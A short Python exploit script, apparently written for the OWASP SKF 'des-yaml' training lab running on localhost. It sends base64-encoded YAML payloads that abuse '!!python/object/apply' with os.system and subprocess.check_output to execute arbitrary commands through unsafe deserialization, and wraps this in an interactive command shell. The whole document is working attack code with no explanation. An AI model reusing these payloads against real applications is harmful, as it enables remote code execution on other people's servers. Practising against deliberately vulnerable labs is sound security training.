#!/usr/bin/python3
# docker run -it -p 5000:5000 blabla1337/owasp-skf-lab:des-yaml

import requests
import signal
import sys
import base64
from bs4 import BeautifulSoup as bs

URL = 'http://localhost:5000/information/'

def def_handler(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

def send_command(cmd):
    payload = base64.b64encode(("""yaml: !!python/object/apply:os.system ['%s 2>&1 > /tmp/file.txt']""" % cmd).encode())
    targeturl = URL + str(payload.decode())
    r = requests.get(targeturl)
    payload = base64.b64encode(("yaml: !!python/object/apply:subprocess.check_output [['cat','/tmp/file.txt']]").encode()) 
    targeturl = URL + str(payload.decode())
    r = requests.get(targeturl)
    soup = bs(r.content, "lxml")
    print(soup.find('p').text.replace("b'", "")[:-1].replace("\\n", "\n"))

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    while True:
        cmd = input("> ")
        send_command(cmd)
